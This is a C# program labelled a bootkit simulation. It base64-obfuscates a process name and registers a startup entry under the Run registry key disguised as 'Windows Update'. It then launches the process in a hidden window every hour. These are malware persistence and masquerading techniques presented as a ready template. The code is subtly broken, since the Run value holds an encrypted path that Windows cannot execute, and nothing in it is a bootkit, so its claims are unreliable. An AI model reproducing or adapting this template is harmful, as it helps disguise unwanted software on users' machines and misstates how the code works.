using System;
using System.Diagnostics;
using System.Threading;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace AdvancedBootkitSimulation
{
    class Program
    {
        static void Main(string[] args)
        {
            // Simple obfuscation of process name
            string calcProcess = Encoding.UTF8.GetString(Convert.FromBase64String("Y2FsYy5leGU="));

            // Stealthy startup registration
            StealthyStartupRegistration();

            while (true)
            {
                // Execute the process in a discreet manner
                ExecuteProcessDiscreetly(calcProcess);
                Thread.Sleep(TimeSpan.FromHours(1)); // Wait for 1 hour
            }
        }

        static void StealthyStartupRegistration()
        {
            string path = System.Reflection.Assembly.GetExecutingAssembly().Location;
            string encryptedPath = Convert.ToBase64String(ProtectedData.Protect(Encoding.UTF8.GetBytes(path), null, DataProtectionScope.CurrentUser));

            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
            {
                key.SetValue("Windows Update", encryptedPath);
            }
        }

        static void ExecuteProcessDiscreetly(string processName)
        {
            var startInfo = new ProcessStartInfo
            {
                FileName = processName,
                WindowStyle = ProcessWindowStyle.Hidden, // Hide the window
                CreateNoWindow = true
            };
            Process.Start(startInfo);
        }
    }
}
